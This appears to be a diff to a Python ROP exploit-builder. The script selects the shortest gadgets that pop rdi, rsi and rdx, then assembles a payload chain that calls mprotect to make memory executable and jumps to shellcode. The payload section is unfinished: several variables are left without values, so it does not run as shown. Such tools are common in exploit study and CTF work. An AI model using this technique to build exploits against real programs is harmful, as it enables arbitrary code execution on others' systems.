@@ -66,23 +66,33 @@ print("Available Gadgets: ")
 for i in gadgets:
         print(i)
 
+# now that duplicates are repmoved, remove gadgets with multiple of: rdi, rsi, rdx
+
 shortest_rdi = 100
 shortest_rsi = 100
 shortest_rdx = 100
+rdi_addr = b""
+rsi_addr = b""
+rdx_addr = b""
 
 for x in range(0, len(gadgets)):
     if (gadgets[x][0][2] == "rdi") and (len(gadgets[x]) < shortest_rdi):
         shortest_rdi = len(gadgets[x])
+        rdi_addr = bytes.fromhex(hex(gadgets[x][0][0])[2:])
     elif (gadgets[x][0][2] == "rsi") and (len(gadgets[x]) < shortest_rsi):
         shortest_rsi = len(gadgets[x])
+        rsi_addr = bytes.fromhex(hex(gadgets[x][0][0])[2:])
     elif (gadgets[x][0][2] == "rdx") and (len(gadgets[x]) < shortest_rdx):
         shortest_rdx = len(gadgets[x])
-    else:
-        print("uhoh")
+        rdx_addr = bytes.fromhex(hex(gadgets[x][0][0])[2:])
 
-print(shortest_rdi)
-print(shortest_rsi)
-print(shortest_rdx)
+print("shortest_rdi = " + str(shortest_rdi))
+print(rdi_addr)
+print("shortest_rsi = " + str(shortest_rsi))
+print(rsi_addr)
+print("shortest_rdx = " + str(shortest_rdx))
+print(rdx_addr)
+
 heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
 if heapOrStack == "S":
         baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
@@ -107,4 +117,22 @@ if heapOrStack == "S":
 
         faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
         faddr_byte_array.reverse()
+
+# check if ROP payload has the gadgets etc to actually be built
+
+# start building ROP payload
+garbage = b"\x00\x00\x00\x00\x00\x00\x00\x00"
+rdi_arg =
+rsi_arg =
+rdx_arg = b"\x07\x00\x00\x00\x00\x00\x00\x00"
+mprotect_addr = # given as input
+shellcode_addr =
+shellcode =
+
+# gadget addrs need to be calculated from base of binary
+
+payload = rdi_addr + rdi_arg + garbage * (shortest_rdi - 2)
+payload += rsi_addr + rsi_arg + garbage * (shortest_rsi - 2)
+payload += rdx_addr + rdx_arg + garbage * (shortest_rdx - 2)
+payload += mprotect_addr + shellcode_addr + shellcode
 
